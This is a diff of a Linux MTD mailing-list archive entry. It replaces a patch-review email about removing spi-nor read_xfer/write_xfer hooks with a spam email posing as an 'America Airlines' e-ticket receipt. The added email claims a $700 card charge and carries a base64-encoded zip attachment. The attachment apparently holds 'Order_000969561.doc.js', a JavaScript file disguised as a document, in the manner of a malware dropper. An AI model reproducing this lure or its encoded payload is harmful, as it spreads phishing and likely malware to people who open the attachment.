@@ -1,24 +1,12 @@
-From: Marek Vasut <marex@denx.de>
-To: Cyrille Pitchen <cyrille.pitchen@atmel.com>
-Subject: Re: [PATCH linux-next 1/4] mtd: spi-nor: remove unused
- read_xfer/write_xfer hooks
-Date: Sat, 19 Sep 2015 05:08:55 +0200
-Cc: nicolas.ferre@atmel.com, broonie@kernel.org, linux-spi@vger.kernel.org,
- dwmw2@infradead.org, computersforpeace@gmail.com, zajec5@gmail.com,
- beanhuo@micron.com, juhosg@openwrt.org, ben@decadent.org.uk,
- jogo@openwrt.org, jteki@openedev.com, linux-kernel@vger.kernel.org,
- linux-arm-kernel@lists.infradead.org, devicetree@vger.kernel.org,
- robh+dt@kernel.org, pawel.moll@arm.com, mark.rutland@arm.com,
- ijc+devicetree@hellion.org.uk, galak@codeaurora.org,
- linux-mtd@lists.infradead.org
-References: <cover.1442590224.git.cyrille.pitchen@atmel.com>
- <719ad7cc8bf6df151dd799cd4f13292fd9471079.1442590224.git.cyrille.pitchen@atmel.com>
-In-Reply-To: <719ad7cc8bf6df151dd799cd4f13292fd9471079.1442590224.git.cyrille.pitchen@atmel.com>
+To: linux-mtd@bombadil.infradead.org
+Subject: Your e-ticket #000969561
+Date: Sun, 20 Sep 2015 10:36:12 +0000
+From: "America Airlines" <orders@aa.com>
+Reply-To: "America Airlines" <orders@aa.com>
+Message-ID: <e90c00b35445b360f74555ce1438568b@aa.com>
 MIME-Version: 1.0
-Content-Type: Text/Plain;
-  charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Message-Id: <201509190508.55496.marex@denx.de>
+Content-Type: multipart/mixed; boundary="b1_62f6f5db05ee1024a5d842240a263447"
+Content-Transfer-Encoding: 8bit
 List-Id: Linux MTD discussion mailing list <linux-mtd.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=unsubscribe>
@@ -28,15 +16,83 @@ List-Help: <mailto:linux-mtd-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=subscribe>
 
-On Friday, September 18, 2015 at 05:49:25 PM, Cyrille Pitchen wrote:
-> struct spi_nor_xfer_cfg and read_xfer/write_xfer hooks were never used by
-> any driver. Do some cleanup by removing them.
-> 
-> Signed-off-by: Cyrille Pitchen <cyrille.pitchen@atmel.com>
+--b1_62f6f5db05ee1024a5d842240a263447
+Content-Type: text/plain; charset=us-ascii
 
-Right, if this will ever be needed, it can be re-added.
+Dear customer,
 
-Reviewed-by: Marek Vasut <marex@denx.de>
+Your payment was successfully processed, your credit card was charged.
 
-Best regards,
-Marek Vasut
+Please print your e-ticket attached to this email.
+
+Order summary:
+
+FLIGHT NUMBER - KS810465
+DATE & TIME - Sep 24 2015, 21:50
+DEPARTING - Phoenix
+TOTAL PRICE - $ 700.00
+
+Thank you for choosing America Airlines.
+
+
+--b1_62f6f5db05ee1024a5d842240a263447
+Content-Type: application/zip; name="Order_000969561.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Order_000969561.zip
+
+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
+
+
+--b1_62f6f5db05ee1024a5d842240a263447--
